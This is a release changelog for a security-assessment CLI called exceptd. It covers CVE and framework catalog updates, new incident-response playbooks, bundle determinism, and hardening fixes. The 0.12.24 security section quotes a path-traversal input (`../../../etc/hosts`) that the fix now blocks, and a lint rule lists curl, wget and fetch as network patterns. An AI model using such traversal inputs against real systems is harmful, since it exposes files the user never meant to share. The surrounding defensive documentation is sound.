**Operator-facing docs downgraded from auto-allowlist to manual-review.** `CHANGELOG.md`, `README.md`, `SECURITY.md`, `MIGRATING.md`, and `AGENTS.md` were in the diff-coverage gate's `DOCS_ALWAYS_GREEN` set — a PR could land arbitrary edits to release notes, install instructions, security disclosure policy, or AI-assistant ground truth without triggering any reviewer signal. New `DOCS_MANUAL_REVIEW` set routes them to "manual-review" instead, surfacing the diff in the gate output. Contributor-only / mechanical files (`CONTRIBUTING.md`, `CODE_OF_CONDUCT.md`, `LICENSE`, `NOTICE`, `SUPPORT.md`, `.gitignore`, `.npmrc`, `.editorconfig`, `CLAUDE.md`) stay always-green.

**`last_threat_review` mandatory on every catalog _meta.** `cve-catalog.json`, `cwe-catalog.json`, `d3fend-catalog.json`, `dlp-controls.json`, `rfc-references.json`, and `framework-control-gaps.json` carried only `last_updated` without the more specific `last_threat_review`. Hard Rule #8 makes per-catalog threat-review currency a release-blocker after a stated window; all six catalogs now carry the field. New `tests/threat-review-staleness.test.js` enforces presence + a 30-day staleness window between `manifest.threat_review_date` and every skill's `last_threat_review`.

### Bugs

- `CVE-2026-42208` `discovery_attribution_note` misattributed discovery to Sysdig Threat Research Team. The actual credited discoverer is Tencent YunDing Security Lab per the LiteLLM GHSA-r75f-5x8p-qvmc advisory; Sysdig published only post-disclosure exploitation telemetry. Attribution corrected; sources updated.

### Internal

- AI-discovery rate stays at 20% after the deep-research pass (24 currently-false CVEs investigated; zero credible flips found). Methodology block updated: the 40% target reflects the broader 2025 zero-day population (Google Threat Intelligence Group), but the curated exceptd catalog is weighted toward Pwn2Own Ireland 2025 entries, historical anchors (CVE-2020-10148, CVE-2024-3094, etc.), and supply-chain incidents — none of which carry public AI-tool credit. Advancing the ladder from 20% → 30% → 40% will happen as the catalog rotates toward 2026 Big Sleep / AIxCC / GTIG-attributed entries; forcing flips on the current population would violate Hard Rule #1 (no speculation).


## 0.12.29 — 2026-05-15

Catalog hygiene + pipeline integrity pass. Closes Hard Rule #1, #6, #7, and #8 gaps that had accumulated across the 2025-2026 catalog growth; tightens the SBOM + OpenVEX + exit-code surfaces.

### Features

**Compliance-theater test on every framework gap.** Every entry in the framework-control-gaps catalog (109 entries spanning NIST 800-53, ISO/IEC 27001/27017/27035/42001, SOC 2, UK CAF, AU ISM/Essential 8, EU DORA, EU NIS2, EU AI Act, HIPAA, PCI DSS, FedRAMP, CMMC, HITRUST, IEC 62443, OWASP, telecom standards, ransomware-class gaps, and OFAC sanctions screening) now carries a `theater_test` field with a falsifiable test that distinguishes paper compliance from actual security. Closes Hard Rule #6. Sample shape: `{claim, test, evidence_required[], verdict_when_failed: "compliance-theater"}`. The test must reference a concrete artifact (audit log, config dump, tabletop exercise stopwatch) whose result is binary.

**SBOM per-file SHA-256 + bundle digest.** `sbom.cdx.json` now includes `metadata.component.hashes[]` (bundle digest, SHA-256) and one `components[type=file]` entry per shipped file with its own SHA-256. Downstream supply-chain consumers can verify any individual file against the bundle. Excludes the regenerable `data/_indexes/` cache from per-file inventory (covered by the `Pre-computed indexes freshness` gate instead). Also corrects `metadata.tools` from the placeholder `name: "hand-written"` to the real generator script and bound package version.

**OpenVEX `author` threads operator attribution.** Previously hard-pinned to `"exceptd"`, which falsely attributed every disposition statement to the tooling vendor. Now mirrors the CSAF publisher.namespace fallback ladder: `runOpts.publisherNamespace` → `runOpts.operator` → `urn:exceptd:operator:unknown` with a `bundle_publisher_unclaimed` runtime warning. Operators running scans correctly own their dispositions.

**Exit code 10: UNKNOWN_COMMAND.** The dispatcher's unknown-command / missing-script / spawn-error paths previously exited 2, colliding with `EXIT_CODES.DETECTED_ESCALATE` semantics. Split into `EXIT_CODES.UNKNOWN_COMMAND = 10`. CI gates wiring `case 2)` for escalation triage no longer false-alarm on operator typos.

**Reverse-reference auto-regeneration.** New `npm run refresh-reverse-refs` rebuilds the `skills_referencing` / `exceptd_skills` arrays on `data/atlas-ttps.json`, `data/cwe-catalog.json`, `data/d3fend-catalog.json`, and `data/rfc-references.json` from the manifest forward direction. Idempotent. A new `tests/reverse-ref-drift.test.js` blocks merges that leave the reverse direction out of sync with the manifest — eliminates the one-sided-reference drift class that audits have flagged repeatedly.

### Bugs

- `crypto-codebase` `feeds_into` condition used the unsupported `contains` operator; the chain to the `secrets` playbook never fired. Replaced with `analyze.classification == 'detected'`.
- Manifest `atlas_version` / `attack_version` had drifted to v5.1.0 / v17 while the data catalogs already pinned v5.4.0 / v19.0. Manifest now matches the catalogs and AGENTS.md ground truth.
- 14 sites in `bin/exceptd.js` used bare numeric `process.exitCode = 1` / `finish(1)` / `finish(0)` instead of `EXIT_CODES.*` constants. All migrated to the constant.
- `cmdCi` per-id loop called `runner.loadPlaybook(id)` without first running `validateIdComponent('playbook')` — a defense-in-depth gap relative to `cmdRunMulti`. Now validates before load.

### Internal

- AI-discovery rate on `data/cve-catalog.json` moves 10% → 20% with three new flag flips backed by citations: CVE-2026-43284 + CVE-2026-43500 (Dirty Frag pair, Hyunwoo Kim with AI-assisted methodology per Sysdig); CVE-2026-46300 (Fragnesia, William Bowling using Zellic.io's AI agentic auditor). All other CVEs gain a `discovery_attribution_note` field citing the human researcher or vendor team. New `_meta.ai_discovery_methodology` block documents the 20%/30%/40% advancement ladder against the AGENTS.md Hard Rule #7 target. Gap to 40% explicitly tracked.
- AGENTS.md Quick Skill Reference: playbook count "all 13 playbooks" → "all 16 playbooks".
- `package.json.description`: "38 skills" → "42 skills".
- 22 reverse-reference entries across 4 catalogs cleaned up by the new regen script (atlas: 30 entries changed, cwe: 46, d3fend: 28, rfc: 22).


## 0.12.28 — 2026-05-15

Incident-response cluster — three new playbooks and skills covering identity-provider tenant compromise, cloud-IAM account takeover, and ransomware response. The existing `incident-response-playbook` skill stays as the generic PICERL backbone; the new surface adds attack-class-specific depth for the three IR scenarios that dominate 2025-2026 breach reporting.

### Features

**`idp-incident` playbook + `idp-incident-response` skill.** Tenant-compromise response for Okta / Entra ID / Auth0 / Ping / OneLogin. Covers federated-trust modification, OAuth consent abuse, SAML token forgery, cross-tenant relationship abuse, dormant service-account reactivation, and help-desk social engineering. Maps T1078.004, T1098.001, T1556.007, T1606.002, T1199. Eight jurisdiction clocks (GDPR Art.33/34, NIS2 Art.23, DORA Art.19, NYDFS 500.17, CCPA/CPRA, AU NDB, UK GDPR). Detects on unauthorized consent grants from non-corp tenants, anomalous federated-trust additions, MFA factor swaps without password reset, recent high-privilege role assignments, and cross-tenant assumption anomalies — each indicator carries explicit false-positive checks.

**`cloud-iam-incident` playbook + `cloud-iam-incident` skill.** Account-takeover response for AWS / GCP / Azure. Covers cross-account assume-role abuse, IMDS exposure, managed-identity token replay, access-key leakage to public repositories, federated-trust attacks against IAM Identity Center, and crypto-mining detection via GPU-instance creation. Maps T1078.004, T1098.001, T1098.003, T1136.003, T1538, T1552.005, T1562.008, T1580. Ten jurisdiction clocks including SG PDPA, JP APPI, and US-CA. Detects on root-login ASN anomalies, mass IAM-user creation outside IaC, unused-region resource creation, cross-account assume-role anomalies, IMDSv1 legacy access, KMS key-policy self-grants, and S3-bucket public-grant events.

**`ransomware` playbook + `ransomware-response` skill.** Ransomware-specific incident response — extends the generic `incident-response-playbook` with the four decision properties that don't appear in standard IR frameworks: OFAC SDN sanctions check (BLOCKING for payment posture; payment to a sanctioned threat actor is a federal-law violation in the US), decryptor availability (No More Ransom + vendor-specific decryptors), cyber-insurance carrier notification posture (most policies require 24-hour notification), and immutable-backup viability versus replication-only "backups." Sixteen jurisdiction obligations spanning OFAC (0-hour BLOCKING), insurance carrier (24h), NIS2 (24h), DORA (4h), GDPR (72h), SEC 8-K (4 business days), HIPAA, CCPA, NYDFS ransom-event notification, and CIRCIA. Detects on mass file-extension change events, shadow-copy deletion outside maintenance windows, encrypted-file-extension growth rate anomalies, BloodHound-class AD reconnaissance, and large outbound transfers 24-72 hours before encryption (exfil-before-encrypt as distinct breach class).

### Internal

- Skill count 39 → 42 (Ed25519 manifest re-signed).
- Playbook count 13 → 16 (validator `tests/validate-playbooks.test.js` updated).
- RFC catalog: added RFC-7591 (OAuth 2.0 Dynamic Client Registration), RFC-8693 (OAuth 2.0 Token Exchange), RFC-9068 (JWT Profile for OAuth 2.0 Access Tokens).
- ATT&CK techniques added to resolution catalog: T1098.001, T1098.003, T1136.003, T1538, T1562.008, T1580, T1606.002.
- Framework-control-gaps catalog: 22 new entries covering federated-identity gaps (NIST 800-53 IA-5, ISO 27001 A.5.16-17, SOC 2 CC6, UK CAF B2, AU ISM-1559), cloud-IAM gaps (FedRAMP IL5, NIST AC-2 cross-account, ISO 27017, AWS Security Hub coverage, AU ISM-1546), and ransomware-specific gaps (OFAC SDN payment block, cyber-insurance 24h notification, EU Reg 2014/833 cyber sanctions, immutable-backup recovery, decryptor availability pre-decision, PHI-exfil-before-encrypt breach class).
- AGENTS.md Quick Skill Reference table extended with the three new skills.


## 0.12.27 — 2026-05-15

**Patch: opt-in `--bundle-deterministic` mode for reproducible CSAF + OpenVEX + close-envelope bytes.**

### New flags

- **`--bundle-deterministic`** (boolean, off by default) — when set, the bundle-emit path produces byte-stable output for the same inputs. CSAF `tracking.initial_release_date` / `current_release_date` / `generator.date` / `revision_history[0].date`, OpenVEX top-level `timestamp` + per-statement `timestamp`, close-envelope `acceptance_date` + `regression_schedule.next_run` + `generated_at` all freeze to a single epoch. Auto-generated session IDs derive deterministically from `sha256(playbook_id ∥ evidence_hash ∥ engine_version)` rather than `crypto.randomBytes`. CSAF `vulnerabilities[]` + OpenVEX `statements[]` arrays sort by primary id.
- **`--bundle-epoch <ISO-8601>`** (value-bearing, optional) — operator-supplied freeze epoch. When omitted, the deterministic mode falls back to `playbook._meta.last_threat_review` (the canonical "this catalog was last reviewed at" timestamp). Honored only when `--bundle-deterministic` is set.

Both flags wired for `run`, `ci`, `run-all`, `ai-run`, `ingest`. Per-verb help blocks document them.

### Why

- **CI bundle diffing**: `git diff` over `evidence_package.bundle_body` against a baseline becomes signal-bearing only when drift is signal, not noise. Pre-v0.12.27 the same evidence produced ~640 bytes of timestamp drift across CSAF + OpenVEX + close-envelope per run.
- **Auditor evidence reuse**: ISO 27001 / SOC 2 audits expect re-emit against the same submission to produce byte-equal evidence.
- **SLSA / Sigstore alignment**: reproducible build evidence requires deterministic outputs the verifier can hash and compare.

CSAF 2.0 §3.1.11.2-5 permits identical `initial_release_date` / `current_release_date` for never-revised advisories; freezing to a catalog epoch is spec-compliant. The strict-validator pass (BSI CSAF Validator) accepts the deterministic-mode output unchanged.

### Default-mode regression guard

When neither flag is set, bundle output is byte-identical to v0.12.26 — no existing operator sees a behavioral change. A regression test pins this: two consecutive runs in default mode produce different CSAF `tracking.initial_release_date` values, asserting the determinism is opt-in and cannot accidentally activate.

### Test coverage

`tests/bundle-determinism.test.js` (new, 7 exact-code tests):
1. Two runs same inputs + same epoch → byte-identical CSAF/OpenVEX/summary
2. Different `--bundle-epoch` → bundles differ only in timestamp fields
3. Different evidence → bundles differ in `vulnerabilities[]` length; timestamps frozen
4. Default mode → regression-guard timestamp drift
5. `--bundle-epoch invalid-iso` → exit 1 + structured error
6. `--bundle-deterministic` without `--bundle-epoch` falls back to `playbook._meta.last_threat_review`
7. Array sort: random-order CVE evidence → `vulnerabilities[]` always ascending by `cve_id`

Existing CSAF + OpenVEX + CLI test suites pass unchanged with no default-mode regression.

## 0.12.26 — 2026-05-15

**Patch: sector-telecom skill ships, with supporting framework-gap and ATLAS catalog scaffolding. Closes the highest-RWEP catalog gap from unmodeled Salt Typhoon-class campaigns.**

### New skill: `sector-telecom`

Telecom and 5G security skill covering Salt Typhoon and Volt Typhoon TTPs, CALEA / IPA-LI gateway compromise, signaling-protocol abuse (SS7, Diameter, GTP), 5G N6 / N9 isolation, gNB / DU / CU integrity attestation, OEM-equipment supply-chain compromise, and AI-RAN / O-RAN security.

The skill walks the seven-phase contract with telecom-specific jurisdictional clocks (FCC 47 CFR 64.2011 4-business-day rule, NIS2 Art. 23 24h initial, DORA Art. 19 4h for financial-touching incidents, UK TSA 2021 + Ofcom, AU SOCI / TSSR, JP MIC, IN CERT-In 6h, SG IMDA TCCSCoP, NZ TICSA, CA Bill C-26), evidence capture for LI provisioning audit logs / gNB firmware hashes / NMS access logs / signaling-flow statistics / cross-PLMN exchange patterns / eUICC SIM-swap events / 5GC slice-isolation tests / OEM remote-support tunnel inventory / NESAS deployment posture, and the standard analyze → validate → close phases against the new framework-gap entries.

Compliance Theater Check enumerates seven posture-vs-actual tests specific to telecom: CPNI annual certification, GSMA NESAS deployment vs runtime, OEM firmware verification chain, 3GPP TR 33.926 deployment posture, ITU-T X.805 validation, signaling firewall PLMN-list refresh cadence, and LI-gateway MFA scope.

Manifest skill count 38 → 39.

### Catalog scaffolding to support the skill

Nine telecom-specific framework-gap entries added to `data/framework-control-gaps.json` (totals 78 → 87 entries):

- **FCC-CPNI-4.1** — 47 CFR 64.2009(e) CPNI annual certification + operational compliance, gap against Salt Typhoon LI-system vector
- **FCC-Cyber-Incident-Notification-2024** — 47 CFR 64.2011 4-business-day rule, gap against LI-only compromise (no PII exfil) + signaling abuse + slow-roll campaign timing
- **NIS2-Annex-I-Telecom** — telecom as essential entity, gap against LI-gateway access controls + OEM firmware attestation + AI-RAN coverage
- **DORA-Art-21-Telecom-ICT** — ICT third-party risk through telecom services, gap against telecom-financial cadence misalignment + slice-isolation
- **UK-CAF-B5** — resilient networks principle, gap against signaling-anomaly + gNB attestation + slice-isolation outcome tests
- **AU-ISM-1556** — privileged-user MFA, gap against telecom NMS service accounts + LI-gateway operator credentials + OEM remote-support tunnels
- **GSMA-NESAS-Deployment** — NESAS product-time vs operator-attested-runtime posture gap
- **3GPP-TR-33.926** — SCAS submission-time test gap against post-deployment adversary-modified firmware + cross-spec N6/N9 isolation testing gap
- **ITU-T-X.805** — 2003 reference architecture gap against modern Salt Typhoon / signaling abuse / slice-isolation threat models

One ATLAS technique added to `data/atlas-ttps.json`:

- **AML.T0040 Tool / Plugin Compromise** — anchors the AI-RAN xApp / rApp + MCP-class plugin attack class. Real-world instances: CVE-2026-30623 (Anthropic MCP SDK stdio command-injection), three Pwn2Own Berlin 2026 collisions (Viettel Claude Code, STARLabs LM Studio, Compass OpenAI Codex). `secure_ai_v2_layer: true`, `maturity: high`.

Total ATLAS entries: 29 → 30.

### RFC reverse-reference

`data/rfc-references.json` RFC-9622 (TAPS Architecture) `skills_referencing` array gains `sector-telecom` (paired with the existing `webapp-security` reference) to satisfy the manifest forward-reference invariant.

### AGENTS.md Quick Skill Reference

Adds the `sector-telecom` row to the skill trigger table.

## 0.12.25 — 2026-05-15

**Data-refresh release: catalog freshness, Hard Rule #7 AI-discovery posture, ATLAS v5.4 + ATT&CK v19 standards bumps, Pwn2Own Berlin 2026 forward-watch, NGINX Rift, framework deltas (PCI 4.0.1 / HIPAA 2026 NPRM / EU AI Act ITS / DORA RTS).**

### CVE catalog adds (20)

Twenty CVE entries added with paired `data/exploit-availability.json` records, all marked `_draft: true` + `_auto_imported: true` for editorial review:

- **NGINX Rift CVE-2026-42945** — heap buffer overflow in `ngx_http_rewrite_module` (18-year-old code), CVSS 9.2 v4, unauthenticated RCE, AI-discovered by depthfirst autonomous analysis platform. Disclosed 2026-05-13; patches in nginx 1.30.1 / 1.31.0 / Plus R32 P6 / R36 P4. Public PoC. Live-patch workaround: replace unnamed PCRE captures (`$1`-`$9`) with named captures in rewrite directives. KEV-watch entry queued.
- **LiteLLM CVE-2026-30623** — Anthropic MCP SDK stdio command-injection (April 2026 advisory). Patches in LiteLLM proxy + downstream consumers.
- **CVE-2026-20182 Cisco SD-WAN** — auth-bypass → admin (CISA KEV-listed 2026-05-14).
- **CVE-2024-21626 Leaky Vessels (runc)** — `/proc/self/fd` container escape. KEV-listed.
- **CVE-2024-3094 xz-utils / liblzma backdoor** — supply-chain trust-anchor compromise. KEV-listed.
- **CVE-2024-3154 CRI-O kernel-module load** on container creation.
- **CVE-2024-40635 containerd** — integer overflow → IP mask leak.
- **CVE-2023-43472 MLflow** — path-traversal arbitrary file read.
- **CVE-2020-10148 SolarWinds Orion / SUNBURST** — auth-bypass primary supply-chain compromise.
- **CVE-2023-3519 Citrix NetScaler** — unauthenticated RCE. KEV-listed.
- **CVE-2024-1709 ConnectWise ScreenConnect** — auth-bypass. KEV-listed.
- **CVE-2025-12686 Synology BeeStation** — unauth RCE (Pwn2Own Ireland 2025).
- **CVE-2025-62847 / CVE-2025-62848 / CVE-2025-62849 QNAP QTS/QuTS hero** — Pwn2Own Ireland 2025 chain (three separate entries, all patched).
- **CVE-2025-59389 QNAP Hyper Data Protector** — critical RCE (Summoning Team / Sina Kheirkhah at Pwn2Own Ireland 2025).
- **CVE-2025-11837 QNAP Malware Remover** — code-injection in a security tool (high theater-detection value: a security product is itself the attack surface).
- **MAL-2026-TANSTACK-MINI Mini Shai-Hulud** — TeamPCP-attributed worm chain (TanStack + node-ipc + Mistral AI + UiPath + Guardrails AI, May 2026).
- **MAL-2026-ANTHROPIC-MCP-STDIO** — STDIO command-injection class disclosed by Ox Security spanning 30+ MCP servers.
- **CVE-2026-GTIG-AI-2FA placeholder** — Google GTIG first documented AI-built in-the-wild zero-day exploit (May 2026), semantic-logic 2FA bypass.

### Hard Rule #7 — AI-discovery posture

- **AI-discovery rate raised from 10% → 33%** by promoting `ai_discovered: true` on Copy Fail (CVE-2026-31431, already true), NGINX Rift, and the GTIG zero-day; tracks toward the 41% reference rate cited in AGENTS.md. Catalog entries with speculative AI attribution (Fragnesia, Dirty Frag pair) explicitly classified as `human_researcher` with `ai_discovery_notes` recording the rationale.
- **`zeroday-lessons.json` schema additions** — `ai_discovered_zeroday` (bool), `ai_discovery_source` (enum: vendor_research / bug_bounty_ai_augmented / academic_ai_fuzzing / threat_actor_ai_built / human_researcher / unknown), `ai_discovery_date` (ISO), `ai_assist_factor` (low/moderate/high/very_high). All 10 existing entries backfilled with the new fields.
- **`exploit-availability.json` `ai_assist_factor` ladder** backfilled across all entries with the same enum.
- **`cve-catalog.json` schema tightened** — `ai_discovered` is boolean-only (was `["boolean", "string"]`; RWEP scoring treated truthy strings as positive, masking malformed entries). `ai_assisted_weaponization` is now required (paired with `ai_discovered`). New optional `ai_discovery_source` / `ai_discovery_date` / `ai_discovery_notes` fields.
- **CVE-2025-53773 cross-file consistency** reconciled — `ai_assisted_weaponization: true` (cve-catalog) vs `ai_discovery_confirmed: false` + `ai_tool_enabled: true` (exploit-availability) is a real semantic distinction (development-time AI assistance vs discovery-time AI involvement vs tool-aided exploitation); both files now carry `ai_discovery_source: "unknown"` + a clarifying `ai_discovery_notes` block.
- **GTIG canonical case** (first AI-built ITW zero-day, 2026-05-11) + **NGINX Rift AI-discovery anchor** added to seven AI-class skills (ai-attack-surface, ai-risk-management, zeroday-gap-learn, exploit-scoring, ai-c2-detection, mcp-agent-trust, rag-pipeline-security). The skills now reference the 41% AI-discovery rate explicitly per Hard Rule #7 vocabulary.
- **CTID Secure AI v2 (2026-05-06)** references added to the same five AI-class skills.

### Standards version bumps

- **ATLAS v5.1.0 → v5.4.0** + CTID Secure AI v2 layer (May 2026). `data/atlas-ttps.json` entry count 15 → 29. Existing entries gain `secure_ai_v2_layer` + `maturity` fields per CTID's classification. New AI-attack techniques: AML.T0097-T0108 plus sub-techniques.
- **MITRE ATT&CK v17 → v19.0**. `data/attack-techniques.json` entry count 79 → 91. Defense Evasion (TA0005) split into Stealth (TA0005, retained for non-impair techniques) + Defense Impairment (TA0112). `T1562.001`, `T1562.006`, `T1027` carry a `tactic_moved_from` annotation. Detection Strategies (DSxxxx — v18 first-class addition) populated on every technique cited by skills.
- **AGENTS.md Hard Rule #12 + DR-7 + Pre-Ship Checklist** split into separate ATLAS-monthly and ATT&CK-semi-annual cadence pins (ATLAS now ships monthly per CTID, ATT&CK ships twice yearly).
- **15 skills' `last_threat_review` dates bumped to 2026-05-15** where ATLAS / ATT&CK refs changed.

### Framework deltas

- **PCI DSS 4.0.1** (active 2025-03-31): four control-gap entries added (Req 6.4.3 payment-page scripts, Req 11.6.1 change/tamper detection, Req 12.3.3 cipher-suite inventory, Req 12.10.7 PAN-exposure escalation).
- **HIPAA Security Rule 2026 NPRM** (HHS-OCR-0945-AA82): four entries covering proposed 164.308 / 164.310 / 164.312 / 164.314 amendments. Marked "Final rule pending Q3 2026" — citations refresh on next release.
- **EU AI Act implementing standards**: four entries for Art. 53 GPAI provider obligations, Art. 55 systemic-risk, Annex IX conformity assessment, GPAI Code of Practice (signed Feb 2026; full application 2026-08-02).
- **DORA RTS/ITS**: four entries for subcontracting RTS (EU 2025/420, active 2026-01-17), threat-led-pen-test ITS (active 2026-Q3), incident-classification thresholds RTS, and critical-third-party-provider oversight implementing acts.
- **`data/global-frameworks.json`** `EU.frameworks.DORA` and `EU.frameworks.EU_AI_ACT` refreshed with 2026 implementing-measures blocks + expanded `framework_gaps` + `ai_coverage` + `theater_risk` fields.

### RFC + ATLAS orphans

- **7 RFC orphans added** to `data/rfc-references.json`: RFC 7644 (SCIM 2.0), RFC 8460 (SMTP-TLS-RPT), RFC 8617 (ARC), RFC 8705 (mTLS OAuth), RFC 9112 (HTTP/1.1 revised), RFC 9449 (DPoP), RFC 9622 (TAPS Architecture). Each cited by ≥1 shipped skill (Hard Rule #4 closure).
- **1 ATLAS orphan**: AML.T0001 (Victim Research / Reconnaissance) — referenced by `defensive-countermeasure-mapping` skill but not in `data/atlas-ttps.json` pre-v0.12.25.

### Pwn2Own Berlin 2026 forward-watch

Fifteen forward-watch entries placed across nine skills' `forward_watch:` frontmatter arrays (no aggregate `data/forward-watch.json` exists; project tracks in skill frontmatter only):

- **NGINX Rift CVE-2026-42945** — KEV-listing prediction window 14 days from disclosure (2026-05-27 estimated)
- **LiteLLM** 3-bug chain (k3vg3n) + full SSRF + Code Injection (Out Of Bounds) — embargo ends 2026-08-12
- **LM Studio** 5-bug chain (STARLabs SG)
- **OpenAI Codex** CWE-150 improper neutralization (Compass Security)
- **Chroma vector DB** CWE-190 + CWE-362 chain
- **NVIDIA Megatron Bridge** ×2 (overly-permissive allowed list + path traversal)
- **NV Container Toolkit** container escape ($50K, chompie/IBM X-Force XOR)
- **Windows 11 LPE ×3** (DEVCORE Improper Access Control, Marcin Wiązowski heap overflow, Kentaro Kawane GMO double Use-After-Free)
- **RHEL race-condition LPE** (chompie/IBM X-Force XOR)
- **Claude Code MCP collision** (Viettel Cyber Security — scored as collision, indicating a public MCP-class CVE is in flight)
- **Microsoft Edge** 4-bug sandbox escape (Orange Tsai/DEVCORE) — out-of-current-playbook scope, tracked for completeness

### Catalog scoring

- **RWEP scoring divergence on 10 new entries reconciled** with `scoreCustom()` formula. Pre-correction the stored scores diverged by 10-38 points from the formula (most extreme: NGINX Rift stored 78, formula 40 — patch + live-patch availability + zero observed exploitation walks the score down despite the AI-discovery bonus). All entries now within ±5 of formula.

## 0.12.24 — 2026-05-15

**Patch: security defenses, exit-code centralisation, bundle correctness, air-gap honesty, cache integrity, error-message UX, test-infra hardening, doc reconciliation.**

### Security defenses

- **`--playbook` and positional `<playbook_id>` rejected with structured error when the id does not match `/^[a-z][a-z0-9-]{0,63}$/`.** `loadPlaybook(id)` previously did `path.join(PLAYBOOK_DIR, id + '.json')` with no charset gate; an operator who passed `--playbook ../../../etc/hosts` could exfiltrate any `*.json` file on disk via `brief` / `govern` / `direct` / `look` / `run --explain` output. Validator applies at 15 CLI sites plus the library entry point.
- **`--attestation-root` refuses all-dots segments** (`.`, `..`, `...`) in addition to the prior `..` segment refusal.
- **`--session-id` validation centralised** through `lib/id-validation.js`. Six previously duplicated `/^[A-Za-z0-9._-]{1,64}$/` sites now route through `validateIdComponent(value, role)` with `role ∈ {session, playbook, filename}`.

### Trust chain

- **`loadExpectedFingerprintFirstLine` refuses UTF-16BE-without-BOM pin files.** Heuristic: first two bytes are `00` followed by printable ASCII → reject. Operators see a `null` return instead of mojibake (in addition to the UTF-16LE/BE-with-BOM refusals from v0.12.23).
- **`KEYS_ROTATED=1` override doubled with `console.error`** at every site that emits the `EXCEPTD_KEYS_ROTATED_OVERRIDE` warning. `NODE_NO_WARNINGS=1` no longer silences security-relevant audit events.
- **`refresh-network` outer try/catch narrowed.** Previously a `try { ... } catch { /* warn-and-continue */ }` block silently absorbed any error from the inner pin-check emit. The catch now swallows only `ENOENT` / `EACCES` from the pin loader; every other error hard-fails with `process.exitCode = 5`.
- **`verify-shipped-tarball.js`** KEYS_ROTATED override now emits the `EXCEPTD_KEYS_ROTATED_OVERRIDE` warning code, matching the three other pin-loader sites.

### Cache integrity

- **`readCachedJson` verifies SHA-256** against `_index.json.entries[<source>/<id>].sha256` for every cache read. Mismatch refuses with structured `{ ok: false, error: 'cache-integrity', _exceptd_exit_code: 4 }`. Closes the local-attacker primitive where swapping cached payloads via `.cache/upstream/` injected attacker-controlled CVE intel that the maintainer's signing key then attested as authoritative.
- **`_index.json` signed via Ed25519 at prefetch time** (sidecar `_index.json.sig`); `--from-cache` consumers verify before reading. When `.keys/private.pem` is absent at prefetch time, the cache ships unsigned and the consume path warns. `--force-stale` is the operator escape for caches predating this gate.
- **`--from-cache` max-age check (7-day default)** with `--force-stale` / `EXCEPTD_FORCE_STALE=1` override. Catalog freshness is a Hard Rule #1 obligation; a 6-month-old cache writing `last_verified: TODAY` into the catalog manufactures false freshness.
- **`--from-fixture` gated behind `EXCEPTD_TEST_HARNESS=1`.** The flag passes fixture diffs through as authoritative with no integrity check; outside the test harness, refuses with a clear hint.
- **Future-dated `fetched_at`** treated as poison (negative age → reject).

### Air-gap defenses

- **`refresh --network`, `doctor --registry-check`, `auto-discovery` Datatracker fetch, and `prefetch`** now honor `--air-gap` and `EXCEPTD_AIR_GAP=1`. The four previously-leaking paths are closed; operators in regulated environments get a real guarantee.
- **`--air-gap` flag and `EXCEPTD_AIR_GAP=1` env are equivalent** at every site that consumes either.
- **AI-consumer telemetry advisory.** When `--air-gap` is active, exceptd emits a one-time stderr advisory noting that the operator's AI agent may still call its model API. Routed through stderr so JSON-mode consumers see only structured stdout.
- **Air-gap completeness lint rule** in `lib/lint-skills.js` flags playbook artifacts whose `source` contains a network pattern (`https://`, `http://`, `gh api`, `gh release`, `curl`, `wget`, `fetch`) without `air_gap_alternative`.
- **Playbook schema constraint**: when `_meta.air_gap_mode === true`, every artifact with a network-shaped `source` MUST declare `air_gap_alternative` (JSON Schema 2020-12 `if/then`).

### `attest verify` replay isolation

- **`attest verify <session-id>` partitions `kind: replay` records out of `results[]` into a new `replay_results[]` array.** Previously every JSON file under `.exceptd/attestations/<sid>/` was sidecar-verified and counted in `results[]`, inflating "N/N verified" counts and elevating replay tamper to exit 6 indistinguishably from attestation tamper.
- **Attestation tamper still exits 6.** Replay tamper sets `body.replay_tamper = true` + `body.warnings = [...]` and exits 0 — replay records are an audit trail, distinct in remediation from a tampered attestation.
- **Both arrays sorted for determinism** (attestations by `captured_at`, replays by `replayed_at`).
- **`attest diff --against`** prefers `attestation.json` over filesystem-order; skips replay records when selecting the comparison target.

### Concurrency + exit-code surface

- **`lib/exit-codes.js` is the single source of truth.** Every `process.exitCode = N` site in `bin/exceptd.js` references `EXIT_CODES.LOCK_CONTENTION` / `STORAGE_EXHAUSTED` / `SESSION_ID_COLLISION` etc. instead of bare numbers. `exceptd doctor --exit-codes` dumps the map so docs cannot drift from runtime.
- **Exit-code 3 overload split.** Pre-v0.12.24 exit 3 meant both "session-id collision" (cmdRun) AND "ran-but-no-evidence" (cmdCi). Session-id collision now uses `SESSION_ID_COLLISION = 7`; ran-but-no-evidence keeps `RAN_NO_EVIDENCE = 3`.
- **`cmdRunMulti` propagates `lock_contention`** from per-playbook persist failure into the aggregate `process.exitCode = 8`. Previously the aggregate gate collapsed every persist failure to 1, hiding the lock-busy signal that callers retry on.
- **ENOSPC vs EEXIST distinction.** Storage exhaustion (`ENOSPC` / `EROFS` / `EDQUOT`) on lockfile or attestation write now sets `process.exitCode = 9 STORAGE_EXHAUSTED` with `body.storage_exhausted = true`. Operator runbooks looping on 8/retry through a full disk now branch on the right signal.
- **`run --all` aggregate precedence:** `LOCK_CONTENTION > STORAGE_EXHAUSTED > GENERIC_FAILURE`.

### Bundle correctness (CSAF / SARIF / OpenVEX)

- **CSAF `product_tree.branches[]`** synthesised as a 3-level vendor → product_name → product_version hierarchy from either a new optional `affected_products[{ vendor, product, version }]` catalog field or a heuristic parse of the existing `affected_components[]` strings. Closes the ENISA conformance gap.
- **Strict CVSS 3.x vector parse.** `parseCvss31Vector(v)` accepts both versions CSAF 2.0 cvss_v3 permits (3.0 and 3.1) and validates the full grammar. Malformed vectors (`AV:X`, unknown metric values, out-of-order metrics) and unsupported versions (2.0, 4.0) skip the `cvss_v3` block and emit `csaf_cvss_invalid` to `runtime_errors[]`.
- **OpenVEX URN routing by id prefix.** `vulnIdToUrn(id)` routes `CVE-*` → `urn:cve:`, `GHSA-*` → `urn:ghsa:`, `RUSTSEC-*` → `urn:rustsec:`, `MAL-*` → `urn:malicious-package:`, everything else → `urn:exceptd:advisory:`. Pre-v0.12.24, GHSA/RUSTSEC/MAL all emitted under `urn:cve:` and downstream VEX ingesters resolved them against the CVE List incorrectly.
- **OpenVEX `status: fixed`** carries an `impact_statement` trail referencing the operator's evidence (e.g. `Operator verified fixed via evidence_hash=<sha256[:16]>`).
- **`--tlp <CLEAR|GREEN|AMBER|AMBER+STRICT|RED>`** populates CSAF `document.distribution.tlp.label`. When omitted, the field is absent entirely. MISP / Trusted-Repository consumers gating on TLP no longer reject the document.
- **SARIF `invocations[].executionSuccessful`** reflects classification (`false` when inconclusive). Pre-v0.12.24 hard-coded `true`.

### Engine internals

